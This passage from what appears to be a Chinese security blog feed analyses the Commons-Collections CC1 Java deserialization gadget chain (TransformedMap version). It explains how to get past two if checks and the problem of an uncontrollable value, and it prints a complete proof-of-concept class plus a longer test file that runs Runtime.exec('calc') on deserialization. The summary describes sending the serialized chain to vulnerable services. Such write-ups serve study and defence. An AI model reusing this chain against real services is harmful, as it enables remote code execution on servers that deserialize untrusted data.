</span><br><span class="line">  <span class="comment">//新增序列化和反序列化  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unser</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就把序列化的问题解决了。</p><h3 id="绕过两个if问题"><a href="#绕过两个if问题" class="headerlink" title="绕过两个if问题"></a>绕过两个if问题</h3><p>需要绕过这两个条件</p><h4 id="第一个if"><a href="#第一个if" class="headerlink" title="第一个if"></a>第一个if</h4><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326190611.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();<span class="comment">//获得我们put进去的key的名称也就是key1</span></span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name); </span><br><span class="line"><span class="comment">// memberTypes是</span></span><br><span class="line"><span class="comment">//第二行是从注解名称Override中查找名称为key1的成员</span></span><br></pre></td></tr></table></figure><p>因为<code>Override</code>注解中没有key1所以就跳出了if判断，因此我们找其他注解<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326185441.png"></p><p>进入<code>@Target</code>注解，看到该注解中有一个名称为value的成员<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326185517.png"></p><p>我们修改一下POC,修改部分如下：</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326190055.png"></p><p>在调试中可以看到已经绕过了第一个if<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326190726.png"></p><h4 id="第二个if"><a href="#第二个if" class="headerlink" title="第二个if"></a>第二个if</h4><p><code>memberType.isInstance(value)</code>是判断value的类型(String)和注解memberType的类型(Class)能不能强转，很显然是不可以强转的，直接绕过了这个if</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326194928.png"></p><h3 id="Value值不可控问题"><a href="#Value值不可控问题" class="headerlink" title="Value值不可控问题"></a>Value值不可控问题</h3><p>接着往下调试，到最后还是执行不了命令的，因为<code>setValue</code>里面的值是下方这个，控制不了参数，需要找解决办法。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326195130.png"></p><h4 id="ConstantTransformer辅助类"><a href="#ConstantTransformer辅助类" class="headerlink" title="ConstantTransformer辅助类"></a>ConstantTransformer辅助类</h4><blockquote><p>前置基础提到过有一个<code>ConstantTransformer</code>，构造方法把接收的参数赋给iConstant，并在调用<code>transform</code>时，不管传入的是什么都会返回iConstant的值。</p></blockquote><p>利用这一点修改POC,只需要在<code>chainedTransformer</code>数组中<code>new ConstantTransformer(Runtime.class)</code>。这样就完成了我们最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        TestHashmap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;jjxxx&quot;</span> );  </span><br><span class="line">        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,chainedTransformer);  </span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; aClass = forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">result1</span> <span class="operator">=</span> constructor.newInstance(Target.class, decorateTestHashmap);  </span><br><span class="line">        ser(result1);  </span><br><span class="line">        unser(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化和反序列化  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unser</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在经过这个<code>ConstantTransformer</code>时就返回了<code>Runtime.class</code>,把之前的值绕过，成功传入了<code>chainedTransformer</code>的第一个参数&#96;<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326200229.png"></p><p><strong>关于ConstantTransformer的利用详情</strong><br>setValue默认的值为下方的<code>AnnotationTypeMismatchExceptionProxy</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memberValue.setValue(  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(  </span><br><span class="line">            annotationType.members().get(name)));</span><br></pre></td></tr></table></figure><p>这个参数在走到我们构造的<code>ChainedTransformer</code>中的第一条时会变成<br><code>new ConstantTransformer(Runtime.class).transform(AnnotationTypeMi..上面的一大串)</code><br>，因为传入的是<code>Runtime.class</code>，因此不管<code>transform</code>不管传入的什么参数，都会返回<code>Runtime.class</code>，这样参数不可控就成功解决了。</p><p>最终弹出计算器<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326200621.png"></p><h2 id="最终流程图"><a href="#最终流程图" class="headerlink" title="最终流程图"></a>最终流程图</h2><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326212710.png"></p><p>感觉有些不妥，又修改了一下</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250403114700.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们把构造好的这条链子序列化之后，在有反序列化漏洞的服务传入，它会把我们构造好的链子反序列化，从而<strong>触发readobject()方法</strong>，由于我们在AnnotationInvocationHandler入口类的构造方法传入了用TransformedMap修饰过的map,在<strong>对map进行遍历的时候就会调用AbstractInputCheckedMapDecorator类的setValue(不可控参数)方法</strong>，它的方法内又会调用<strong>parent.checkSetValue(不可控参数)方法</strong>，parent.checkSetValue()由于遍历转换成了调用<strong>TransformedMap.checkSetValue(不可控参数)</strong>,checkSetValue()会调用<strong>chainsedTransmer.transform(不可控参数)</strong>，接着就是chainsedTransmer数组内的调用，<br>首先是<code>ConstantTransformer.transform()-&gt;返回Runtime.class；</code>等数组循环完就会成功执行命令<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></p><blockquote><p>到此TransformedMap版的CC1链就分析完了，后续会再写一篇分析LazyMap版的CC1链。</p></blockquote><p><strong>本文章测试时用到的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.commons.Method.getMethod;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//       1.直接调用Runtime  </span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//       2.利用反射调用  </span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; runtimeClass = Class.forName(&quot;java.lang.Runtime&quot;);  </span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod =runtimeClass.getMethod(&quot;getRuntime&quot;);  </span></span><br><span class="line"><span class="comment">//        Object getRuntimeinstance=getRuntimeMethod.invoke(null);  </span></span><br><span class="line"><span class="comment">//        Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);  </span></span><br><span class="line"><span class="comment">//        exec.invoke(getRuntimeinstance,&quot;calc&quot;);  </span></span><br><span class="line"><span class="comment">//        或者  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();  </span></span><br><span class="line"><span class="comment">//        Class c=Runtime.class;  </span></span><br><span class="line"><span class="comment">//        Method m= c.getMethod(&quot;exec&quot;,String.class);  </span></span><br><span class="line"><span class="comment">//        m.invoke(runtime,&quot;calc&quot;);  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//        3.InvokerTransformer执行命令  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();  </span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);  </span></span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//        4.加上transformedMap执行命令  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();  </span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);  </span></span><br><span class="line"><span class="comment">//        下面为新增  </span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; TestHashmap = new HashMap&lt;&gt;();  </span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,null,invokerTransformer);  </span></span><br><span class="line"><span class="comment">//        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span></span><br><span class="line"><span class="comment">//        Method checkSetValueMethod = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);  </span></span><br><span class="line"><span class="comment">//        checkSetValueMethod.setAccessible(true);  </span></span><br><span class="line"><span class="comment">//        checkSetValueMethod.invoke(decorateTestHashmap, runtime );  </span></span><br><span class="line"><span class="comment">//        5.遍历map  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();  </span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);  </span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; TestHashmap = new HashMap&lt;&gt;();  </span></span><br><span class="line"><span class="comment">//        TestHashmap.put(&quot;key1&quot;, &quot;value1&quot; );  </span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,null,invokerTransformer);  </span></span><br><span class="line"><span class="comment">//        for (Map.Entry&lt;Object, Object&gt; entry : decorateTestHashmap.entrySet()) &#123;  </span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);  </span></span><br><span class="line"><span class="comment">//        &#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//        6.新增Annotation..Handler  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();  </span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);  </span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; TestHashmap = new HashMap&lt;&gt;();  </span></span><br><span class="line"><span class="comment">//        TestHashmap.put(&quot;key1&quot;, &quot;value1&quot; );  </span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,null,invokerTransformer);  </span></span><br><span class="line"><span class="comment">//        final Class&lt;?&gt; aClass = forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span></span><br><span class="line"><span class="comment">//        Constructor constructor = aClass.getDeclaredConstructor(Class.class, Map.class);  </span></span><br><span class="line"><span class="comment">//        constructor.setAccessible(true);  </span></span><br><span class="line"><span class="comment">//        Object result1 = constructor.newInstance(Override.class, TestHashmap);  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        7.Runtime序列化问题  </span></span><br><span class="line"><span class="comment">//        普通反射  </span></span><br><span class="line"><span class="comment">//        Class&lt;Runtime&gt; runtimeClass = Runtime.class;  </span></span><br><span class="line"><span class="comment">//        Method getruntime = runtimeClass.getMethod(&quot;getRuntime&quot;);  </span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getruntime.invoke(null,null);  </span></span><br><span class="line"><span class="comment">//        Method execmethod =runtimeClass.getMethod(&quot;exec&quot;,String.class);  </span></span><br><span class="line"><span class="comment">//        execmethod.invoke(runtime,&quot;calc&quot;);  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        用InvokerTransformer写上面的反射  </span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;  </span></span><br><span class="line"><span class="comment">//        Method getruntime=(Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);  </span></span><br><span class="line"><span class="comment">//        Runtime runtime   = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);  </span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//        新增chainedTransformer  </span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;  </span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)  </span></span><br><span class="line"><span class="comment">//        &#125;;  </span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  </span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        ser(result1);  </span></span><br><span class="line"><span class="comment">//        unser(&quot;ser.bin&quot;);  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public static void ser(Object obj) throws IOException &#123;  </span></span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));  </span></span><br><span class="line"><span class="comment">//        oos.writeObject(obj);  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line"><span class="comment">//    public static Object unser(String Filename) throws IOException, ClassNotFoundException&#123;  </span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  </span></span><br><span class="line"><span class="comment">//        Object obj = ois.readObject();  </span></span><br><span class="line"><span class="comment">//        return obj;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.freebuf.com/articles/web/383152.html">https://www.freebuf.com/articles/web/383152.html</a><br><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x05-TransformMap%E7%89%88CC1%E6%89%8B%E5%86%99-EXP">https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x05-TransformMap%E7%89%88CC1%E6%89%8B%E5%86%99-EXP</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commons-Collections </tag>
            
            <tag> Commons-Collections1 </tag>
            
            <tag> CC1链 </tag>
            
            <tag> Java安全 </tag>
            
            <tag> Java反序列化漏洞 </tag>
            
            <tag> 反序列化利用链链分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化-字符逃逸漏洞解读</title>
      <link href="/2025/03/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/"/>
      <url>/2025/03/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/</url>
      
